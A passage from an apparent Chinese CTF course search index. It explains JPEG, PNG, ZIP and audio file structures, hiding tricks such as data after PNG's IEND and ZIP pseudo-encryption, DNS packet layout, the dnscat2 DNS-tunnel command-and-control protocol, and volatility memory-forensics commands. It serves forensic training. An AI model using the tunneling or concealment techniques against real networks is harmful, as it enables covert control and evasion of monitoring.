<li>GIF\u00a0\u6709\u635f\u4e14\u53ea\u652f\u6301\u00a0256\u00a0\u8272</li> <li>\u65b0\u5174\u683c\u5f0f\u5982\u00a0HEIF\u3001WebP\u3001AVIF\u00a0\u7b49</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#jpeg","title":"JPEG \u6587\u4ef6\u7ed3\u6784","text":"<p>JPEG\u00a0\u4f7f\u7528\u5206\u6bb5\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5b58\u50a8\uff0c\u5404\u6bb5\u4ee5\u00a00xFF\u00a0\u5f00\u5934\uff0c\u540e\u63a5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u7c7b\u578b\uff1a</p> <ul> <li>FFD8\uff08SOI\uff09\uff1a\u6587\u4ef6\u5f00\u59cb</li> <li>FFE0\uff08APP0\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u6bb5\uff0c\u5305\u542b\u6587\u4ef6\u683c\u5f0f\u4fe1\u606f\uff08\u4e0a\u56fe\u6ca1\u6709\uff09</li> <li>FFE1\uff08APP1\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u6bb5\uff0c\u5305\u542b\u00a0EXIF\u00a0\u4fe1\u606f\uff08\u4e0a\u56fe\u6ca1\u6709\uff09</li> <li>FFDB\uff08DQT\uff09\uff1a\u91cf\u5316\u8868\u6570\u636e</li> <li>FFC0\uff08SOF\uff09\uff1a\u5e27\u6570\u636e\uff0c\u5305\u542b\u56fe\u50cf\u5bbd\u9ad8\u3001\u8272\u5f69\u6a21\u5f0f\u7b49\u4fe1\u606f</li> <li>FFC4\uff08DHT\uff09\uff1ahuffman\u00a0\u8868\u6570\u636e</li> <li>FFDA\uff08SOS\uff09\uff1a\u626b\u63cf\u6570\u636e\uff0c\u5305\u542b\u6570\u636e\u7684\u626b\u63cf\u65b9\u5f0f\uff0chuffman\u00a0\u8868\u7684\u4f7f\u7528\u65b9\u5f0f\u7b49</li> <li>FFD9\uff08EOI\uff09\uff1a\u6587\u4ef6\u7ed3\u675f</li> </ul> <p>\u538b\u7f29\u539f\u7406</p> <p>JPEG\u91c7\u7528DCT(\u79bb\u6563\u4f59\u5f26\u53d8\u6362)\u548cHuffman\u7f16\u7801\u8fdb\u884c\u56fe\u7247\u538b\u7f29</p>"},{"location":"Courses/ctf/MiscTopic/#png","title":"PNG \u6587\u4ef6\u7ed3\u6784","text":"<ul> <li>\u6587\u4ef6\u5934\u00a089 50 4E 47 0D 0A 1A 0A | .PNG....</li> <li>\u91c7\u7528\u5206\u5757\u7684\u65b9\u5f0f\u5b58\u50a8\u6570\u636e<ul> <li>\u6bcf\u5757\u7684\u7ed3\u6784\u90fd\u662f\u00a04\u00a0\u5b57\u8282\u957f\u5ea6\u00a0+ 4\u00a0\u5b57\u8282\u7c7b\u578b\u00a0+\u00a0\u6570\u636e\u00a0+ 4\u00a0\u5b57\u8282\u00a0CRC\u00a0\u6821\u9a8c</li> <li>\u56db\u4e2a\u6807\u51c6\u6570\u636e\u5757\uff1aIHDR\u3001PLTE\u3001IDAT\u3001IEND</li> <li>\u5176\u4ed6\u8f85\u52a9\u6570\u636e\u5757\uff1aeXIf\u3001tEXt\u3001zTXt\u3001tIME\u3001gAMA\u2026\u2026<ul> <li>eXIf\u00a0\u5143\u4fe1\u606f\uff0ctIME\u00a0\u4fee\u6539\u65f6\u95f4\uff0ctEXt\u00a0\u6587\u672c\uff0czTXt\u00a0\u538b\u7f29\u6587\u672c</li> </ul> </li> </ul> </li> </ul> <p>\u56db\u79cd\u6807\u51c6\u6570\u636e\u5757\uff1a</p> <ul> <li>IHDR\uff1a\u5305\u542b\u56fe\u50cf\u57fa\u672c\u4fe1\u606f\uff0c\u5fc5\u987b\u4f4d\u4e8e\u5f00\u5934<ul> <li>4\u00a0\u5b57\u8282\u5bbd\u5ea6\u00a0+ 4\u00a0\u5b57\u8282\u9ad8\u5ea6<ul> <li>\u901a\u8fc7\u4fee\u6539\u56fe\u50cf\u7684\u5bbd\u5ea6\u9ad8\u5ea6\u6570\u636e\uff0c\u4f7f\u5f97\u56fe\u50cf\u663e\u793a\u4e0d\u5168\u4ece\u800c\u9690\u85cfflag</li> <li>\u4fee\u6539\u5bbd\u9ad8\uff0c\u8fd8\u9700\u8981\u4fee\u6539CRC\u6821\u9a8c\u7801 (Windows\u6821\u9a8c\u7801\u9519\u4e86\u4e5f\u80fd\u6253\u5f00)</li> </ul> </li> <li>1\u00a0\u5b57\u8282\u4f4d\u6df1\u5ea6\uff1a1\u30012\u30014\u30018\u300116</li> <li>1\u00a0\u5b57\u8282\u989c\u8272\u7c7b\u578b\uff1a0\u00a0\u7070\u5ea6\uff0c2 RGB\uff0c3\u00a0\u7d22\u5f15\uff0c4\u00a0\u7070\u5ea6\u900f\u660e\uff0c6 RGB\u00a0\u900f\u660e</li> <li>1\u00a0\u5b57\u8282\u538b\u7f29\u65b9\u5f0f\uff0c1\u00a0\u5b57\u8282\u6ee4\u6ce2\u65b9\u5f0f\uff0c\u5747\u56fa\u5b9a\u4e3a\u00a00</li> <li>1\u00a0\u5b57\u8282\u626b\u63cf\u65b9\u5f0f\uff1a0\u00a0\u975e\u9694\u884c\u626b\u63cf\uff0c1 Adam7\u00a0\u9694\u884c\u626b\u63cf</li> </ul> </li> <li>PLTE\uff1a\u8c03\u8272\u677f\uff0c\u53ea\u5bf9\u7d22\u5f15\u989c\u8272\u7c7b\u578b\u6709\u7528</li> <li>IDAT\uff1a\u56fe\u50cf\u6570\u636e\uff0c\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u6700\u5927\u00a02\u00a031\u00a0-1\u00a0\u5b57\u8282</li> <li>IEND\uff1a\u6587\u4ef6\u7ed3\u675f\u6807\u5fd7\uff0c\u5fc5\u987b\u4f4d\u4e8e\u6700\u540e\uff0c\u5185\u5bb9\u56fa\u5b9a<ul> <li>PNG\u00a0\u6807\u51c6\u4e0d\u5141\u8bb8\u00a0IEND\u00a0\u4e4b\u540e\u6709\u6570\u636e\u5757\uff0c\u4f46\u662f\u4f4d\u4e8eIEND\u5757\u4e4b\u540e\u7684\u6570\u636e\u4e0d\u4f1a\u88ab\u663e\u793a\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u8fd9\u91cc\u968f\u610f\u85cf\u6570\u636e</li> </ul> </li> </ul> <p>\u538b\u7f29\u7b97\u6cd5</p> <p>PNG\u91c7\u7528Deflate\u538b\u7f29\u7b97\u6cd5 (\u4e00\u79cdLZ77\u7ed3\u5408Huffman\u7f16\u7801\u7684\u7b97\u6cd5)</p>"},{"location":"Courses/ctf/MiscTopic/#zip","title":"ZIP \u6587\u4ef6\u7ed3\u6784","text":"<p>\u5148\u62ff\u4e00\u4e2a\u6b63\u5e38\u7684\u538b\u7f29\u5305\u4e3e\u4f8b\uff0c\u5728\u4e0b\u56fe\u4e2d</p> <ul> <li>\u524d\u9762\u7684\u7070\u8272\u80cc\u666f\u7684\u5341\u516d\u8fdb\u5236\u6570\u5b57\u4e3a \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\uff0c  </li> <li>\u4e2d\u95f4\u7d2b\u8272\u80cc\u666f\u7684\u5341\u516d\u8fdb\u5236\u6570\u5b57\u4e3a \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\uff0c  </li> <li>\u540e\u9762\u9ec4\u8272\u80cc\u666f\u7684\u5341\u516d\u8fdb\u5236\u6570\u5b57\u4e3a \u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7\u3002</li> </ul> <p></p> <p>\u63a5\u4e0b\u6765\u6309\u987a\u5e8f\u63cf\u8ff0\u4e0d\u540c\u6570\u636e\u7684\u542b\u4e49\uff1a</p> <p>\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\uff1a</p> <ul> <li><code>50 4b 03 04</code> \u5934\u6587\u4ef6\u6807\u8bb0</li> <li><code>0A 00</code> \u89e3\u538b\u6587\u4ef6\u6240\u9700\u8981\u7684pkware\u7248\u672c<ul> <li>\u6709\u4e9b\u9898\u76ee\u4f1a\u5c06\u8fd9\u4e2a\u7248\u672c\u8c03\u7684\u5f88\u9ad8\uff0c\u8ba9\u4f60\u65e0\u6cd5\u89e3\u538b</li> </ul> </li> <li><code>00 00</code> \u5168\u5c40\u65b9\u5f0f\u4f4d\u52a0\u5bc6<ul> <li>\u901a\u8fc7\u6b64\u5904\u5224\u65ad\u6709\u65e0\u52a0\u5bc6</li> <li><code>0x 00</code> \u5982\u679cx\u662f\u5076\u6570\uff0c\u5219\u672a\u52a0\u5bc6\uff1b\u5947\u6570\uff0c\u5219\u52a0\u5bc6</li> <li>\u548c\u538b\u7f29\u6587\u4ef6\u76ee\u5f55\u533a\u7684\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\u914d\u5408\u67e5\u770b\uff0c\u5982\u679c\u4e00\u4e2a\u662f\u52a0\u5bc6\uff0c\u4e00\u4e2a\u4e0d\u662f\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u4f2a\u52a0\u5bc6</li> </ul> </li> <li><code>00 00</code> \u538b\u7f29\u65b9\u5f0f</li> <li><code>72 98</code> \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65f6\u95f4</li> <li><code>C3 52</code> \u6700\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f</li> <li><code>A7 DE 6A 5F</code> CRC-32 \u6821\u9a8c\u7801</li> <li><code>07 00 00 00</code> \u538b\u7f29\u540e\u5c3a\u5bf8</li> <li><code>07 00 00 00</code> \u672a\u538b\u7f29\u5c3a\u5bf8</li> <li><code>08 00</code> \u6587\u4ef6\u540d\u957f\u5ea6</li> <li><code>00 00</code> \u62d3\u5c55\u8bb0\u5f55\u957f\u5ea6</li> </ul> <p>\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u533a\uff1a</p> <ul> <li><code>50 4B 01 02</code> \u76ee\u5f55\u4e2d\u6587\u4ef6\u6587\u4ef6\u5934\u6807\u8bb0</li> <li><code>3F 00</code> \u538b\u7f29\u4f7f\u7528\u7684pkware\u7248\u672c</li> <li><code>0A 00</code> \u89e3\u538b\u6240\u9700pkware\u7248\u672c</li> <li><code>00 00</code> \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0</li> </ul> <p>\u538b\u7f29\u6e90\u6587\u4ef6\u76ee\u5f55\u7ed3\u675f\u6807\u5fd7</p> <ul> <li><code>50 4B 05 06</code> \u76ee\u5f55\u7ed3\u675f\u6807\u8bb0</li> </ul>"},{"location":"Courses/ctf/MiscTopic/#_2","title":"\u97f3\u9891\u6587\u4ef6\u7ed3\u6784","text":"<ul> <li>mp3\uff1a\u6709\u635f\u538b\u7f29<ul> <li>\u5177\u4f53\u683c\u5f0f\u4e0d\u591a\u4ecb\u7ecd\uff0c\u9047\u5230\u4e86\u57fa\u672c\u4e0a\u4e5f\u5c31\u662f\u58f0\u97f3\u672c\u8eab\u7684\u9690\u5199</li> </ul> </li> <li>wav\uff1a\u65e0\u635f\u65e0\u538b\u7f29\uff08waveform\uff09<ul> <li>\u76f4\u63a5\u5b58\u50a8\u7684\u662f\u97f3\u9891\u7684\u6ce2\u5f62\u6570\u636e\uff0c\u53ef\u64cd\u4f5c\u6027\u66f4\u9ad8</li> <li>\u6587\u4ef6\u7ed3\u6784\u4e5f\u662f\u5206\u00a0chunk\u00a0\u7684\uff0c\u6709\u00a0RIFF\u3001fmt\u3001data\u00a0\u7b49</li> <li>\u7f16\u7801\u97f3\u9891\u6570\u636e\u7684\u00a0sample\u00a0\u4e5f\u53ef\u4ee5\u8fdb\u884c\u00a0LSB\u00a0\u9690\u5199</li> </ul> </li> <li>flac\uff1a\u65e0\u635f\u538b\u7f29\uff0c\u5982\u679c\u51fa\u73b0\u53ef\u80fd\u8003\u8651\u8f6c\u6362\u4e3a\u00a0wav</li> <li>\u4f7f\u7528\u00a0Python\u00a0\u7684\u00a0soundfile / librosa\u00a0\u5e93\u8fdb\u884c\u97f3\u9891\u5904\u7406<ul> <li>\u7248\u672c\u517c\u5bb9\u95ee\u9898\u633a\u4e25\u91cd\u7684\uff0c\u6211\u641e\u4e0d\u597d\u8fd9\u73a9\u610f</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#misc_2","title":"Misc \u4e13\u9898\u4e8c \u6d41\u91cf\u53d6\u8bc1\u4e0e\u533a\u5757\u94fe\u57fa\u7840","text":""},{"location":"Courses/ctf/MiscTopic/#udpdns","title":"UDP(DNS) \u6d41\u91cf\u5206\u6790","text":""},{"location":"Courses/ctf/MiscTopic/#dns","title":"\u4f20\u8f93\u901a\u9053 DNS\u534f\u8bae","text":"<p><code>DNS</code>\u00a0\u901a\u5e38\u4e3a\u00a0<code>UDP</code>\u00a0\u534f\u8bae</p> <p>\u62a5\u6587\u683c\u5f0f\uff1a</p> <pre><code>+-------------------------------+ \n| \u62a5\u6587\u5934                         | \n+-------------------------------+ \n| \u95ee\u9898 (\u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206)     | \n+-------------------------------+ \n| \u56de\u7b54 (\u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55)       | \n+-------------------------------+ \n| \u6388\u6743 (\u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55)            | \n+-------------------------------+ \n| \u989d\u5916\u7684 (\u989d\u5916\u7684\u8d44\u6e90\u8bb0\u5f55)          | \n+-------------------------------+\n</code></pre> <p>\u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0c\u00a0<code>DNS</code>\u00a0\u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002</p> <p>\u6bcf\u4e2a\u00a0<code>question</code>\u00a0\u90e8\u5206:</p> <pre><code>   0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5 \n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ \n |                    QNAME                      |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ \n |                    QTYPE                      | \n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ \n |                    QCLASS                     | \n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre> <ul> <li><code>QNAME</code>\u00a0\uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528. \u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a\u00a0<code>0</code>\u00a0\u5b57\u8282\u8868\u793a\u7ed3\u675f</li> <li><code>QTYPE</code>\u00a0\uff1a\u5360\u00a0<code>16</code>\u00a0\u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u6709\u00a0<code>16</code>\u00a0\u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a<code>1</code>\u00a0(\u00a0<code>A</code>\u00a0\u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673a\u00a0<code>IP</code>\u00a0\u5730\u5740)\u3001<code>2</code>\u00a0(\u00a0<code>NS</code>\u00a0\uff0c\u8bf7\u6c42\u6388\u6743\u00a0<code>DNS</code>\u00a0\u670d\u52a1\u5668)\u3001<code>5</code>\u00a0(\u00a0<code>CNAME</code>\u00a0\u522b\u540d\u67e5\u8be2)</li> </ul> <ul> <li>\u7f16\u7801<ul> <li>\u4e24\u65b9\u6570\u636e\u90fd\u4ee5\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u4f20\u8f93\uff0c\u4f8b\u5982 <code>AAA</code> \u53d8\u4e3a <code>414141</code></li> <li>\u5ffd\u7565domain\u4e2d\u7684\u53e5\u70b9\uff0c\u5373 <code>41.4141</code>\uff0c <code>414.141</code>\u548c<code>414141</code>\u5b8c\u5168\u7b49\u4ef7</li> <li>\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u56e0\u6b64 <code>5b</code> \u548c <code>5B</code> \u4e5f\u662f\u7b49\u4ef7\u7684</li> </ul> </li> <li>\u53d1\u9001/\u63a5\u6536<ul> <li>\u5bf9\u4e8e\u6570\u636e\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u9009\u62e9\u4e3a\u5176\u6dfb\u52a0\u81ea\u5df1\u7684\u6743\u5a01\u57df\u540d\u6216\u5728\u524d\u9762\u52a0\u4e0a\u9759\u6001\u6807\u7b7e (dnscat,\u4f7f\u7528UDP/53\u76f4\u8fde)\uff0c\u5982\uff1a<ul> <li><code>&lt;encoded data&gt;.&lt;domain&gt;</code></li> <li><code>&lt;tag&gt;.&lt;encoded data&gt;</code></li> </ul> </li> <li>\u4efb\u4f55\u4e0d\u662f\u8fd9\u79cd\u5f62\u5f0f\u7684\u6570\u636e\uff0c\u6216\u8005\u4e0d\u662f\u4e0d\u53d7\u652f\u6301\u7684\u8bb0\u5f55\u4e2d\u7684\u6570\u636e\u952e\u5165\uff0c\u6216\u8005\u5177\u6709 DNSCAT \u672a\u77e5\u7684\u9644\u52a0\u57df\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u88ab\u670d\u52a1\u5668\u4e22\u5f03\u6216\u8f6c\u53d1\u5230\u4e0a\u6e38 DNS \u670d\u52a1\u5668</li> <li>dnscat2 \u670d\u52a1\u5668\u5fc5\u987b\u4f7f\u7528\u683c\u5f0f\u6b63\u786e\u7684 DNS \u54cd\u5e94\u8fdb\u884c\u54cd\u5e94 \u76f4\u63a5\u53d1\u9001\u5230\u53d1\u51fa\u8bf7\u6c42\u7684\u4e3b\u673a\uff0c\u5982\u679c\u6709\u591a\u4e2aanswer\uff0c\u9009\u62e9\u7b2c\u4e00\u4e2a</li> </ul> </li> <li>\u6d88\u606f\u7c7b\u578b<ul> <li>dnscat \u670d\u52a1\u5668\u652f\u6301\u6700\u5e38\u89c1\u7684 DNS \u6d88\u606f\u7c7b\u578b\uff1a<code>TXT</code>\u3001<code>MX</code>\u3001<code>CNAME</code>\u3001<code>A</code>\u3001<code>AAAA</code></li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#dnscat","title":"DNSCAT \u534f\u8bae","text":"<p>dnscat2\u662f\u4e00\u4e2aDNS\u96a7\u9053\u5de5\u5177\uff0c\u901a\u8fc7DNS\u534f\u8bae\u521b\u5efa\u52a0\u5bc6\u7684\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053</p> <p>\u4e0a\u9762\u5b9a\u4e49\u4e86\u901a\u8fc7DNS\u53d1\u9001\u6570\u636e\u7684 DNS Transport Protocol\uff1b\u4e0b\u9762\u662f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4ea4\u6d41\u7684 dnscat protocol</p> <ul> <li>\u4f1a\u8bdd\u7531\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a <code>SYN</code> \u6570\u636e\u5305\u5e76\u4e14\u670d\u52a1\u5668\u54cd\u5e94\u4e00\u4e2a <code>SYN</code> \u6570\u636e\u5305\u6765\u542f\u52a8\u3002\u5ba2\u6237\u53d1\u9001 <code>MSG</code> \u6570\u636e\u5305\uff0c\u670d\u52a1\u5668\u4f7f\u7528 <code>MSG</code> \u6570\u636e\u5305\u8fdb\u884c\u54cd\u5e94\u3002</li> <li>\u5f53\u5ba2\u6237\u7aef\u51b3\u5b9a\u8fde\u63a5\u5df2\u7ed3\u675f\uff0c\u5b83\u4f1a\u5c06 <code>FIN</code> \u6570\u636e\u5305\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u4ee5 <code>FIN</code> \u6570\u636e\u5305\u54cd\u5e94\u3002</li> <li>\u5f53\u670d\u52a1\u5668\u51b3\u5b9a\u8fde\u63a5\u7ed3\u675f\uff0c\u5b83\u4f1a\u7528 <code>FIN</code> \u54cd\u5e94\u6765\u81ea\u5ba2\u6237\u7aef\u7684 <code>MSG</code> \u5e76\u4e14\u5ba2\u6237\u7aef\u4e0d\u5e94\u518d\u54cd\u5e94\u3002</li> </ul> <p>A <code>flags</code> field is exchanged in the <code>SYN</code> packet. These flags affect the entire session.</p> <p>\u826f\u597d\u7684\u8fde\u63a5\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <pre><code>+----------------+\n| Client  Server |\n+----------------+\n|  SYN --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- SYN   |\n|   v       |    |\n|  MSG --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- MSG   |\n|   v       |    |\n|  MSG --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- MSG   |\n|  ...     ...   |\n|  ...     ...   |\n|  ...     ...   |\n|   |       |    |\n|   v       |    |\n|  FIN --&gt;  |    |\n|           v    |\n|      &lt;-- FIN   |\n+----------------+\n</code></pre> <p>\u5982\u679c\u670d\u52a1\u5668\u51b3\u5b9a\u8fde\u63a5\u5df2\u7ed3\u675f\uff0c\u5219\u670d\u52a1\u5668\u8fd4\u56de <code>FIN</code> :</p> <pre><code>+----------------+\n| Client  Server |\n+----------------+\n|  SYN --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- SYN   |\n|   v       |    |\n|  MSG --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- MSG   |\n|   v       |    |\n|  MSG --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- FIN   |\n|   v            |\n| (nil)          |\n+----------------+\n</code></pre> <p>\u5982\u679c\u6536\u5230\u610f\u5916\u7684 <code>MSG</code>\uff0c\u670d\u52a1\u5668\u5c06\u54cd\u5e94\u9519\u8bef (<code>FIN</code>)\uff1a</p> <pre><code>+----------------+\n| Client  Server |\n+----------------+\n|  MSG --&gt;  |    |\n|   |       v    |\n|   |  &lt;-- FIN   |\n|   v            |\n| (nil)          |\n+----------------+\n</code></pre> <p>\u5982\u679c\u6536\u5230\u610f\u5916\u7684 <code>FIN</code>\uff0c\u670d\u52a1\u5668\u5c06\u5ffd\u7565\u5b83\uff1a</p> <pre><code>+----------------+\n| Client  Server |\n+----------------+\n|  FIN --&gt;  |    |\n|           v    |\n|         (nil)  |\n+----------------+\n</code></pre> <p>MESSAGE_TYPE_SYN [0x00]</p> <ul> <li>(uint16_t) packet_id</li> <li>(uint8_t) message_type [0x00]</li> <li>(uint16_t) session_id</li> <li>(uint16_t) initial sequence number</li> <li>(uint16_t) options</li> <li>If OPT_NAME is set:<ul> <li>(ntstring) session_name</li> </ul> </li> </ul> <p>MESSAGE_TYPE_MSG: [0x01]</p> <ul> <li>(uint16_t) packet_id</li> <li>(uint8_t) message_type [0x01]</li> <li>(uint16_t) session_id</li> <li>(uint16_t) seq</li> <li>(uint16_t) ack</li> <li>(byte[]) data</li> </ul> <p>MESSAGE_TYPE_FIN: [0x02]</p> <ul> <li>(uint16_t) packet_id</li> <li>(uint8_t) message_type [0x02]</li> <li>(uint16_t) session_id</li> <li>(ntstring) reason</li> </ul> <p>MESSAGE_TYPE_ENC: [0x03]</p> <ul> <li>(uint16_t) packet_id</li> <li>(uint8_t) message_type [0x03]</li> <li>(uint16_t) session_id</li> <li>(uint16_t) subtype</li> <li>(uint16_t) flags</li> <li>If subtype is ENC_SUBTYPE_INIT:<ul> <li>(byte[32]) public_key_x</li> <li>(byte[32]) public_key_y</li> </ul> </li> <li>If subtype is ENC_SUBTYPE_AUTH:<ul> <li>(byte[32]) authenticator</li> </ul> </li> </ul> <p><code>SEQ</code> (sequence) and <code>ACK</code> (acknowledgement) numbers \u7528\u6cd5\u548cTCP\u4e2d\u7c7b\u4f3c\u3002\u5728\u8fde\u63a5\u7684\u5f00\u59cb\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u90fd\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u7684 <code>ISN</code> (Initial Sequence Number) \u5e76\u53d1\u9001\u7ed9\u5bf9\u65b9\u3002</p> <p>\u5ba2\u6237\u7aef\u7684 <code>SEQ</code> \u5c31\u662f\u670d\u52a1\u5668\u7684 <code>ACK</code> \uff1b\u670d\u52a1\u5668\u7684 <code>SEQ</code> \u5c31\u662f\u5ba2\u6237\u7aef\u7684 <code>ACK</code> \u3002\u8fd9\u4e5f\u610f\u5473\u7740\u53cc\u65b9\u90fd\u77e5\u9053\u9884\u671f\u7684\u5b57\u8282\u504f\u79fb\u91cf</p>"},{"location":"Courses/ctf/MiscTopic/#_3","title":"\u5185\u5b58\u53d6\u8bc1","text":""},{"location":"Courses/ctf/MiscTopic/#_4","title":"\u57fa\u7840\u4ecb\u7ecd","text":"<ul> <li>\u5185\u5b58\u53d6\u8bc1\u5c31\u662f\u4ece\u5185\u5b58\uff08RAM\uff09\u4e2d\u627e\u5230\u3001\u63d0\u53d6\u6709\u4ef7\u503c\u7684\u4fe1\u606f<ul> <li>\u7cfb\u7edf\u8fd0\u884c\u4e2d\u4f1a\u5927\u91cf\u4f7f\u7528\u5185\u5b58\uff0c\u5185\u5b58\u4e2d\u4f1a\u5305\u542b\u5f88\u591a\u4fe1\u606f</li> <li>\u8fd9\u4e9b\u4fe1\u606f\u5305\u62ec\u8fd0\u884c\u7684\u8fdb\u7a0b\u3001\u7f51\u7edc\u8fde\u63a5\u3001\u5185\u6838\u6a21\u5757\u3001\u6253\u5f00\u7684\u6587\u4ef6\u7b49\u7b49</li> </ul> </li> <li>\u4e00\u822c\u8fd9\u79cd\u9898\u76ee\u90fd\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5de8\u5927\u7684\u00a0raw\u00a0\u6587\u4ef6<ul> <li>\u5927\u5c0f\u51e0\u4e4e\u7b49\u4e8e\u9776\u673a\u00a0RAM\u00a0\u7684\u5927\u5c0f</li> <li>\u662f\u76f4\u63a5\u00a0dump\u00a0\u51fa\u6765\u7684\u00a0raw\u00a0\u5185\u5b58\u6570\u636e<ul> <li>\u5229\u7528\u00a0DumpIt\uff08Win\uff09\u3001LiME\uff08Linux\uff09\u7b49\u5de5\u5177\u53ef\u4ee5\u00a0dump\u00a0\u51fa\u5185\u5b58</li> </ul> </li> <li>Windows\u00a0\u7684\u5c45\u591a\uff08\u5229\u7528\u66f4\u4e30\u5bcc\uff09</li> <li>\u901a\u8fc7\u5de5\u5177\u5206\u6790\u5185\u5b58\u6570\u636e\uff0c\u627e\u5230\u6709\u6548\u6709\u4ef7\u503c\u7684\u4fe1\u606f</li> </ul> </li> </ul>"},{"location":"Courses/ctf/MiscTopic/#volatility","title":"volatility \u5de5\u5177\u7684\u4f7f\u7528","text":"<p>Volatility\u662f\u4e00\u6b3e\u5f00\u6e90\u5185\u5b58\u53d6\u8bc1\u6846\u67b6\uff0c\u80fd\u591f\u5bf9\u5bfc\u51fa\u7684\u5185\u5b58\u955c\u50cf\u8fdb\u884c\u5206\u6790\uff0c\u901a\u8fc7\u83b7\u53d6\u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u4f7f\u7528\u63d2\u4ef6\u83b7\u53d6\u5185\u5b58\u7684\u8be6\u7ec6\u60c5\u51b5\u4ee5\u53ca\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u6001\u3002</p> <ul> <li>\u67e5\u770b\u00a0volatility\u00a0\u652f\u6301\u7684\u00a0profile\u3001\u63d2\u4ef6\u7b49<ul> <li>volatility --info</li> </ul> </li> <li>\u67e5\u770b\u5185\u5b58\u53ef\u80fd\u7684\u7cfb\u7edf\u7248\u672c\u4ee5\u53ca\u5bf9\u5e94\u7684\u00a0volatility profile<ul> <li>volatility -f mem.raw imageinfo</li> <li>\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u00a0profile\uff0c\u90fd\u8bd5\u4e00\u8bd5</li> </ul> </li> <li>volatility -f &lt;mem_file&gt; --profile=\\&lt;profile&gt; \\&lt;command&gt;<ul> <li>\u5217\u51fa\u8fdb\u7a0b\uff1apslist psxview psscan pstree</li> <li>\u5217\u51fa\u547d\u4ee4\u884c\u4fe1\u606f\u7b49\uff1acmdscan consoles cmdline</li> <li>\u5217\u51fa\u73af\u5883\u53d8\u91cf\uff1aenvars</li> <li>\u5217\u51fa\u7f51\u7edc\u8fde\u63a5\uff1anetscan connscan</li> <li>\u6587\u4ef6\u76f8\u5173\uff1afilescan dumpfiles mftparser<ul> <li>volatility -f mem.raw --profile=\\&lt;profile&gt; dumpfiles -Q \\&lt;Offset&gt; ./</li> </ul> </li> <li>\u6ce8\u518c\u8868\u76f8\u5173\uff1ahivelist hivedump printkey</li> <li>\u670d\u52a1\u8fd0\u884c\u72b6\u6001\uff1asvcscan</li> <li>\u83b7\u53d6\u8fdb\u7a0b\u5185\u5b58\uff1amemdump -p \\&lt;pid&gt; -D \\&lt;output_dir&gt;</li> 